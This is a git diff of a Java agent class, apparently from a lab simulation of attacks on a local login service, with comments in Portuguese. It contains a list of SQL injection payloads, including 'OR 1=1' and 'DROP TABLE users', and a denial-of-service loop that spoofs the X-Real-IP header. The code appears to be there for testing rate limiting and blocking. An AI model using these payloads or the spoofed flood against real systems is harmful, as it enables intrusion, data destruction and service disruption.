@@ -16,10 +16,17 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.Random;
 
+import java.util.Random;
+
+
 public class AttackAgent extends Agent {
     private static final int DOS = 0;
     private static final int INJECTION = 1;
     private static final String TARGET_URL = "http://localhost:8080/login";
+    private static final String[] USERNAMES = {"Ataque0", "Ataque1"};   // Ataque1 nao tem conta   
+    private static final String[] PASSWORDS = {"123", "123"};
+    private final Random random = new Random();
+
 
     private boolean notifiedCreate = false;
     private final String fakeIp;
@@ -89,20 +96,20 @@ public class AttackAgent extends Agent {
 
                 // Gera payloads variados
                 String[] payloads = {
-    "admin' --",
-    "' OR '1'='1",
-    "\" OR \"\"=\"",
-    "1'; DROP TABLE users--",
-    "admin'/*"
-};
+                    "admin' --",
+                    "' OR '1'='1",
+                    "\" OR \"\"=\"",
+                    "1'; DROP TABLE users--",
+                    "admin'/*"
+                };
                 String payload = payloads[new Random().nextInt(payloads.length)];
                 
-String json = String.format(
-    "{\"username\":\"%s\",\"password\":\"%s\"}", 
-    payload.replace("\"", "\\\""),  
-    "hacked_password"
-);
-                    System.out.println("Iniciando ataque Injection com: " + payload);
+                String json = String.format(
+                    "{\"username\":\"%s\",\"password\":\"%s\"}", 
+                    payload.replace("\"", "\\\""),  
+                    "hacked_password"
+                );
+                System.out.println("Iniciando ataque Injection com: " + payload);
                 try (OutputStream os = con.getOutputStream()) {
                     os.write(json.getBytes(StandardCharsets.UTF_8));
                 }
@@ -115,7 +122,7 @@ String json = String.format(
                     while ((line = br.readLine()) != null) {
                         response.append(line);
                     }
-                    System.out.println("Resposta: " + response);
+                    // System.out.println("Resposta: " + response);
                 }
                 
             } catch (Exception e) {
@@ -126,83 +133,88 @@ String json = String.format(
     }
 
 
-     private static class DosBehaviour extends TickerBehaviour {
-    private final String fakeIp;
-    private static final int MAX_ATTEMPTS = 50;
-    private int failedAttempts = 0;
-    private boolean shouldTerminate = false;
+    private class DosBehaviour extends TickerBehaviour {
+        private final String fakeIp;
+        private static final int MAX_ATTEMPTS = 50;
+        private int failedAttempts = 0;
+        private boolean shouldTerminate = false;
+        private final String username;
+        private final String password;
 
-    public DosBehaviour(Agent a, long period, String fakeIp) {
-        super(a, period);
-        this.fakeIp = fakeIp;
-    }
-
-    protected void onTick() {
-        if (shouldTerminate) {
-            terminateAgent();
-            return;
+        public DosBehaviour(Agent a, long period, String fakeIp) {
+            super(a, period);
+            this.fakeIp = fakeIp;
+            this.username = USERNAMES[random.nextInt(USERNAMES.length)];
+            this.password = PASSWORDS[random.nextInt(PASSWORDS.length)];
         }
 
-        if (failedAttempts >= MAX_ATTEMPTS) {
-            System.out.println("[" + getAgent().getLocalName() + "-DoS] Máximo de tentativas alcançado");
-            shouldTerminate = true;
-            terminateAgent();
-            return;
-        }
-
-        try {
-            URL url = new URL(TARGET_URL);
-            HttpURLConnection con = (HttpURLConnection) url.openConnection();
-            
-            con.setRequestMethod("POST");
-            con.setRequestProperty("X-Real-IP", this.fakeIp);
-            con.setDoOutput(true);
-            
-            try (OutputStream os = con.getOutputStream()) {
-                String json = "{\"username\":\"user\",\"password\":\"pass\"}";
-                os.write(json.getBytes(StandardCharsets.UTF_8));
-            }
-
-            int code = con.getResponseCode();
-            
-            if (code == 429) { // Too Many Requests
-                System.out.println("[" + getAgent().getLocalName() + "-DoS] IP limitado: " + fakeIp);
-                shouldTerminate = true;
-                terminateAgent();
-                return;
-            } 
-            else if (code == 403) { // Forbidden
-                System.out.println("[" + getAgent().getLocalName() + "-DoS] IP bloqueado: " + fakeIp);
-                shouldTerminate = true;
+        protected void onTick() {
+            if (shouldTerminate) {
                 terminateAgent();
                 return;
             }
-            else if (code >= 400 && code != 429 && code != 403) {
-                System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro no servidor: " + code);
-                failedAttempts++;
-            }
-            else {
-                System.out.println("[" + getAgent().getLocalName() + "-DoS] Requisição enviada. Código: " + code);
-            }
-            
-            con.disconnect();
-            
-        } catch (Exception e) {
-            System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro inesperado: " + e.getMessage());
-            failedAttempts++;
-            
+
             if (failedAttempts >= MAX_ATTEMPTS) {
+                System.out.println("[" + getAgent().getLocalName() + "-DoS] Máximo de tentativas alcançado");
                 shouldTerminate = true;
                 terminateAgent();
+                return;
+            }
+
+            try {
+                URL url = new URL(TARGET_URL);
+                HttpURLConnection con = (HttpURLConnection) url.openConnection();
+                
+                con.setRequestMethod("POST");
+                con.setRequestProperty("Content-Type", "application/json");
+                con.setRequestProperty("X-Real-IP", this.fakeIp);
+                con.setDoOutput(true);
+                
+                try (OutputStream os = con.getOutputStream()) {
+                    String json = String.format("{\"username\":\"%s\",\"password\":\"%s\"}", username, password);
+                    os.write(json.getBytes(StandardCharsets.UTF_8));
+                }
+
+                int code = con.getResponseCode();
+                
+                if (code == 429) { 
+                    System.out.println("[" + getAgent().getLocalName() + "-DoS] IP limitado: " + fakeIp);
+                    shouldTerminate = true;
+                    terminateAgent();
+                    return;
+                } 
+                else if (code == 403) { 
+                    System.out.println("[" + getAgent().getLocalName() + "-DoS] IP bloqueado: " + fakeIp);
+                    shouldTerminate = true;
+                    terminateAgent();
+                    return;
+                }
+                else if (code >= 400 && code != 429 && code != 403) {
+                    System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro no servidor: " + code);
+                    failedAttempts++;
+                }
+                else {
+                    System.out.println("[" + getAgent().getLocalName() + "-DoS] Requisição enviada. Código: " + code);
+                }
+                
+                con.disconnect();
+                
+            } catch (Exception e) {
+                System.err.println("[" + getAgent().getLocalName() + "-DoS] Erro inesperado: " + e.getMessage());
+                failedAttempts++;
+                
+                if (failedAttempts >= MAX_ATTEMPTS) {
+                    shouldTerminate = true;
+                    terminateAgent();
+                }
             }
         }
-    }
 
-    private void terminateAgent() {
-        stop(); 
-        getAgent().doDelete(); 
+        private void terminateAgent() {
+            stop(); 
+            getAgent().doDelete(); 
+        }
     }
-}
 }
 
 
